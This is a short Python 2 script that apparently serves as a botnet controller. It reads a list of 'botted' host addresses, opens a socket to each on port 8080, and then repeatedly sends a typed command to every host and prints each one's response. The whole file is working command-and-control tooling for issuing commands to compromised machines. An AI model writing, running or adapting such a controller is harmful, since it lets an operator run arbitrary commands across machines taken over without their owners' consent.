#!/usr/bin/python2

import socket, select, subprocess
import sys

socks = []

#connects to the sockets	
fvar = open("botted_hosts.txt", "r")
for line in fvar:
	sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	addr = line.strip()
	print 'Connected to' + ' ' + addr
	sock.connect((addr, 8080))
	socks.append(sock)
	
while True:
	bot = 1
	commstr = raw_input('Enter a command:\n')
	if commstr == 'exit':
		for sock in socks:
			print 'Response from bot' + ' ' + str(bot)		
			print 'Disconnected'
			bot = bot + 1
			
		quit()
	else:		
		for sock in socks:
			print 'Repsonse from bot' + ' ' + str(bot)
			sock.send(commstr)
			output = sock.recv(1024)
			print output
			bot = bot + 1





	

